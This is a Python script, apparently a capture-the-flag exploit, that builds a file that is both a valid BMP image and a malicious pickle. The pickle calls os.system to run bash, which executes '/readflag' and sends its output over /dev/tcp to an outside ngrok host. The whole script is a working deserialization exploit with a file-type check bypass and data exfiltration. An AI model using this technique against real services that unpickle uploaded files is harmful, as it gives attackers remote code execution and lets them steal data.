import struct
from pathlib import Path


def make_min_bmp(width=1, height=1, bgr=(0, 255, 0)):
    bfType = b'BM'
    bfReserved1 = bfReserved2 = 0
    bfOffBits = 14 + 40
    row_bytes = ((width * 3 + 3) // 4) * 4
    pixel_data = (bytes((bgr[0], bgr[1], bgr[2])) +
                  b'\x00' * (row_bytes - width * 3)) * height
    bfSize = bfOffBits + len(pixel_data)

    file_header = struct.pack('<2sIHHI', bfType, bfSize, bfReserved1, bfReserved2, bfOffBits)
    info_header = struct.pack('<IIIHHIIIIII',
                              40, width, height, 1, 24, 0,
                              len(pixel_data), 0x0B13, 0x0B13, 0, 0)
    return file_header + info_header + pixel_data

def build_lenprefixed_poly_bmp(width=1, height=1, bgr=(0, 255, 0)):
    bmp = make_min_bmp(width, height, bgr)

    D = b'\x00' + bmp[10:]
    if len(D) >= (1 << 24):
        raise ValueError("D too large; keep image tiny so BINBYTES length's MSB is 0.")

    def make_pickle(extra_pairs=0, D=D):
        P = bytearray()
        P += b'B'
        P += struct.pack('<I', len(D))
        P += D

        if extra_pairs:
            P += (b'N0' * extra_pairs)

        P += b'0'

        P += b"cos\nsystem\n(Vbash -c \"/readflag '--give-me-the-f|ag' > /dev/tcp/7.tcp.eu.ngrok.io/10566\"  \ntR."
        
        return bytes(P)

    TARGET_LOW16 = 0x4D42
    P0 = make_pickle(0, D)
    need16 = (TARGET_LOW16 - (len(P0) & 0xFFFF)) & 0xFFFF

    if need16 & 1:
        D = D + b'\x00'
        P0 = make_pickle(0, D)
        need16 = (TARGET_LOW16 - (len(P0) & 0xFFFF)) & 0xFFFF

    extra_pairs = need16 // 2
    P = make_pickle(extra_pairs, D)

    prefix = struct.pack('<I', len(P))
    assert prefix[:2] == b'BM', "First two bytes must be 'BM' for BMP magic"
    return prefix + P

def main():
    out = Path('poly.bmp')
    data = build_lenprefixed_poly_bmp()
    out.write_bytes(data)

if __name__ == '__main__':
    main()                 
